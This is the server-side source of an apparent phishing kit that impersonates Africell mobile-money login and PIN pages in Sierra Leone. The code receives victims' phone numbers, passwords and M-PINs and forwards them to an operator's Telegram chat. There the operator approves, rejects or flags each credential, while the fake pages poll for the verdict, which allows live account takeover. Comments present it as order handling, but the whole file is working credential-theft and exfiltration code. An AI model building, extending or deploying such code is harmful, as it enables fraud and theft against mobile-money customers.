const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Tells Express to serve your static HTML files

// Memory pads to track user authentication states by phone number
const orderStatuses = {};   
const lastSubmissionTime = {}; 

// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 seconds limit

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return await response.json();
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('Error:', error.message);
        throw error;
    }
}

// Handles both Login (Password) and Pin Submissions
app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        const currentTime = Date.now(); 
        const cooldownTime = 15 * 1000; // 15 seconds cooldown

        // Prevent duplicate spam submissions within 15 seconds
        if (lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        lastSubmissionTime[phone] = currentTime;
        orderStatuses[phone] = 'pending'; // Reset status to pending for this step

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇸🇱";
        const countryCode = "+232";

        // Check if this submission is from pin.html (PIN code) or login.html (Password)
        const isPinStep = /^\d+$/.test(uniqueId) && uniqueId.length >= 4; 
        const headerTitle = isPinStep ? "🔐 *Africell M-PIN Submitted*" : "🔔 *New Africell Login Attempt*";
        const credentialLabel = isPinStep ? "M-PIN" : "Password";

        // Formatted cleanly so tapping/copying only grabs the flag, code, and number together
        const message = `${headerTitle}\n\n` +
                        `📱 Phone: \`${countryFlag} ${countryCode} ${phone.replace('+232', '').trim()}\`\n` +
                        `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const wrongButtonText = isPinStep ? "⚠️ Wrong PIN" : "⚠️ Wrong Password";

        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${phone}_${uniqueId || 'N/A'}` },
                        { text: "❌ Reject", callback_data: `reject_${phone}_${uniqueId || 'N/A'}` }
                    ],
                    [
                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${uniqueId || 'N/A'}` }
                    ]
                ]
            }
        });

        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

// Polling loop to check if admin approved the login or PIN
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = orderStatuses[phone] || 'pending';
    
    console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
    res.json({ status });
});

// Handles inline button clicks from Telegram admin
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let uniqueId = 'N/A';
            let messageTitle = 'Processed Request';

            if (callbackData.startsWith('approve_')) {
                const parts = callbackData.replace('approve_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                orderStatuses[phone] = 'approved';
                actionText = 'Approved ✅';
                messageTitle = 'Approval Result';
            } else if (callbackData.startsWith('reject_')) {
                const parts = callbackData.replace('reject_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                orderStatuses[phone] = 'rejected';
                actionText = 'Rejected ❌';
                messageTitle = 'Rejection Result';
            } else if (callbackData.startsWith('wrong_id_')) {
                const parts = callbackData.replace('wrong_id_', '').split('_');
                phone = parts[0];
                uniqueId = parts[1] || 'N/A';
                orderStatuses[phone] = 'wrong_id';
                actionText = 'Incorrect Credential ⚠️';
                messageTitle = 'Credential Error Result';
            }

            const countryFlag = "🇸🇱";
            const countryCode = "+232";

            let updatedMessage = `📋 *${messageTitle}*\n\n` +
                                 `📱 Phone: \`${countryFlag} ${countryCode} ${phone.replace('+232', '').trim()}\`\n` +
                                 `🔑 Credential: \`${uniqueId}\`\n` +
                                 `📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl =
            `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;

        const result = await fetch(telegramUrl).then(res => res.json());

        console.log('Telegram webhook setup:', result);
        console.log('Webhook URL:', webhookUrl);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});